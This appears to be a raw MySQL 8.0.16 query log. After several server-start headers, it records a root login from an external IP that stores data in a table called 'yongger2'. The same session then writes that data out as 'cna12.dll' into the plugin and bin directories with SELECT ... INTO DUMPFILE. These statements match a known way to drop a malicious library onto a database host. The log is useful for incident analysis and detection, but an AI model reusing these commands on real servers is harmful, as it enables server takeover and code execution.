/usr/sbin/mysqld, Version: 8.0.16 (MySQL Community Server - GPL). started with:
Tcp port: 0  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
/usr/sbin/mysqld, Version: 8.0.16 (MySQL Community Server - GPL). started with:
Tcp port: 0  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
/usr/sbin/mysqld, Version: 8.0.16 (MySQL Community Server - GPL). started with:
Tcp port: 0  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
# Time: 2019-12-10T13:25:34.981130+08:00
# User@Host: root[root] @  [47.56.102.142]  Id:    63
# Query_time: 0.000242  Lock_time: 0.000083 Rows_sent: 0  Rows_examined: 1
use mysql;
SET timestamp=1575955534;
update yongger2 set data = @a;
# Time: 2019-12-10T13:25:34.993005+08:00
# User@Host: root[root] @  [47.56.102.142]  Id:    63
# Query_time: 0.000216  Lock_time: 0.000061 Rows_sent: 0  Rows_examined: 0
SET timestamp=1575955534;
select data from yongger2 into DUMPFILE "\\usr\\lib\\mysql\\plugin\\\\cna12.dll";
# Time: 2019-12-10T13:25:34.995254+08:00
# User@Host: root[root] @  [47.56.102.142]  Id:    63
# Query_time: 0.000117  Lock_time: 0.000060 Rows_sent: 0  Rows_examined: 0
SET timestamp=1575955534;
select data from yongger2 into DUMPFILE '..\\bin\\cna12.dll';